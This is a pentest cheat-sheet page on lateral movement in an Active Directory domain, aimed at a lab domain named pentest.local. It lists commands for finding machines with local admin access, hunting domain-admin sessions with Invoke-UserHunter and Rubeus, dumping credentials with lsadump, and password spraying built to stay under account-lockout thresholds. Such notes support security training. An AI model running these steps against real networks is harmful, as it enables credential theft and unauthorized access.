---
description: Attacking other machines in the Domain.
---

# IV - Lateral Movement

{% hint style="info" %}
Once you get access to another computer do not forget to do **lsadump**
{% endhint %}

## Local Admin Access

Find other machines where we have Local Admin Access

```text
Find-LocalAdminAccess -Verbose
```

## Remote Access

PowerShell Remoting

```text
. .\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```

WMI Access

```text
. .\Find-WMILocalAdminAccess.ps1
Find-WMILocalAdminAccess
```

## Users logged on

Get Users logged on specific computer

```text
Get-NetLoggedon -ComputerName adminsrv.pentest.local
```

Sessions on computer

```text
Get-NetSession -ComputerName adminsrv.pentest.local
```

## User Hunter

Hunting "Domain Admin" session on another computers we have access to

```text
Invoke-UserHunter
```

Check other groups than DA

```text
Invoke-UserHunter -GroupName "RDPUsers"
```

Waiting for incoming session

```text
Invoke-UserHunter -ComputerName adminsrv.pentest.local -Poll 100 -UserName Administrator -Delay 5 -Verbose
# OR
.\Rubeus.exe monitor /interval:5 /nowrap
```

## Find Local Admins

Find local admins on all machines of the domain \(`Get-NetComputer`+`Get-NetLocalGroup`\)

```text
Invoke-EnumerateLocalAdmin -Verbose
```

## **Password Spraying**

Check policy and care to not lock accounts

```text
(Get-DomainPolicy)."system access"
```

| Setting Key | Explanation |
| :--- | :--- |
| **LockoutDuration** | The number of minutes that a locked-out account MUST remain locked out before automatically becoming unlocked. -1 = MUST be unclock by admin other = number of minutes |
| **LockoutBadCount** | Number of failed logon attempts after which a user account MUST be locked out. |
| **ResetLockoutCount** | Number of minutes after a failed logon attempt that the account MUST be locked out |

{% hint style="warning" %}
Very noisy tool
{% endhint %}

Use [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray):

```text
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
```

